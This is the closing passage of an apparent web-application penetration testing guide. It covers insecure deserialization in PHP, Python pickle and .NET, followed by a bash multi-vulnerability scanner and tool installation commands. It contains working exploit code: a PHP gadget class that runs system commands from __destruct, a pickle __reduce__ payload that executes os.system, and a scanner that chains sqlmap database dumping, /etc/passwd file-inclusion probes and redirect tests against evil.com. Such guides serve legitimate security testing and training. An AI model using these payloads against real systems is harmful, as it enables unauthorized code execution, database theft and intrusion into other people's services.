Content-Type: application/x-java-serialized-object

[base64 encoded payload]
```

### PHP Deserialization

#### Detection Patterns
```php
// Look for these functions
unserialize()
serialize()

// Magic methods
__wakeup()
__destruct() 
__toString()
__call()
```

#### Basic PHP Deserialization
```php
// Vulnerable code
$data = unserialize($_GET['data']);

// Payload creation
class Evil {
    public function __destruct() {
        system('whoami');
    }
}

$payload = serialize(new Evil());
echo urlencode($payload);
```

### Python Pickle Deserialization

#### Detection
```python
import pickle
pickle.loads()
pickle.load()
```

#### Exploitation
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(RCE())
# Send payload to application
```

### .NET Deserialization

#### Common Vulnerable Methods
```csharp
BinaryFormatter.Deserialize()
XmlSerializer.Deserialize()
JavaScriptSerializer.Deserialize()
Json.NET JsonConvert.DeserializeObject()
```

#### Detection Patterns
```
# Look for serialized data patterns
AAEAAAD/////  (.NET BinaryFormatter)
<SerializableClass> (XML)
{"$type": (JSON.NET)
```

---

## Additional Resources and Tools

### Comprehensive Testing Scripts

#### Multi-vulnerability Scanner
```bash
#!/bin/bash
target=$1

echo "[+] Starting comprehensive vulnerability scan for $target"

# XSS Testing
echo "[+] Testing for XSS"
echo $target | gau | gf xss | dalfox pipe

# SQLi Testing  
echo "[+] Testing for SQL Injection"
echo $target | gau | gf sqli | sqlmap --batch --dbs

# LFI Testing
echo "[+] Testing for LFI"
echo $target | gau | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

# Open Redirect Testing
echo "[+] Testing for Open Redirects"
export LHOST="http://evil.com"; echo $target | gau | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'

echo "[+] Scan complete"
```

### Useful Wordlists and Payloads

#### Parameter Discovery
- `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`
- `/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt`

#### XSS Payloads
- `/usr/share/seclists/Fuzzing/XSS/`
- Custom payload lists from AwesomeXSS repository

#### SQLi Payloads  
- `/usr/share/seclists/Fuzzing/SQLi/`
- Custom time-based and boolean-based payloads

#### LFI Payloads
- `/usr/share/seclists/Fuzzing/LFI/`
- Custom path traversal combinations

### Recommended Tools Installation

```bash
# Core tools
go install github.com/tomnomnom/gau@latest
go install github.com/lc/gf@latest  
go install github.com/tomnomnom/qsreplace@latest
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Specialized tools
pip3 install sqlmap
git clone https://github.com/r0oth3x49/ghauri.git
git clone https://github.com/s0md3v/XSStrike.git
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
```

This comprehensive guide covers the major web vulnerabilities with practical payloads, detection methods, and exploitation techniques. Remember to always test responsibly and only on systems you have permission to test.